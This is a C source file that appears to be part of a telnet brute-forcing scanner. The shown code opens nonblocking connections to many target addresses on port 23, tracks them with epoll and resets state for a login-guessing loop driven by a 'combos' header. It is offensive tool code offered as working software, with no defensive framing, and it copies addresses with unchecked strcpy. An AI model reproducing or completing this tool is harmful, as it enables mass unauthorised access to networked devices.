#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/epoll.h>

#include "headers/main.h"
#include "headers/dead.h"
#include "headers/resp.h"
#include "headers/queue.h"
#include "headers/combos.h"

void start_connection(char *address, Brute *old_brute)
{
    int fd;

    if((fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0)) == -1)
        return;

    if(fd > maxfds)
        maxfds = fd;

    if(address != NULL)
        strcpy(bruter[fd].address, address);
    else if(old_brute != NULL)
    {
        strcpy(bruter[fd].address, old_brute->address);
        bruter[fd].tries = old_brute->tries;
    }

    struct sockaddr_in addr = {AF_INET, tport, .sin_addr.s_addr = inet_addr(bruter[fd].address)};
    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

#ifdef DEBUG
    printf("Starting Connection For %s:23, fd: %d\n", bruter[fd].address, fd);
#endif
    control_epoll(fd, EPOLL_CTL_ADD, EPOLLIN | EPOLLET);

    bruter[fd].stage = BR_IACS;
    bruter[fd].fd = fd;
    bruter[fd].last_recv = time(0);
    
    ATOMIC_INC(&processing);
}

void check_connection(int fd, int fake_time)
{
    int err = 0, ret;
    socklen_t err_len = sizeof(int);

    ret = getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len);

    if(ret == 0 && err == 0)
    {
#ifdef DEBUG
        printf("Successfull Connection with %s:23\n", bruter[fd].address);
#endif
        control_epoll(fd, EPOLL_CTL_MOD, EPOLLIN | EPOLLET);
        bruter[fd].last_recv = fake_time;
    }
    else
    {
#ifdef DEBUG
        printf("Unsuccessfull Connection with %s:23\n", bruter[fd].address);
#endif
        control_epoll(fd, EPOLL_CTL_DEL, EPOLLOUT);
        close(fd);
        ATOMIC_DEC(&processing);
        bzero(&bruter[fd], sizeof(Brute));
    }
}

void disconnect(Brute *brute)
{
    control_epoll(brute->fd, EPOLL_CTL_DEL, EPOLLOUT);
    close(brute->fd);

    bzero(brute, sizeof(Brute));
    ATOMIC_DEC(&processing);
}
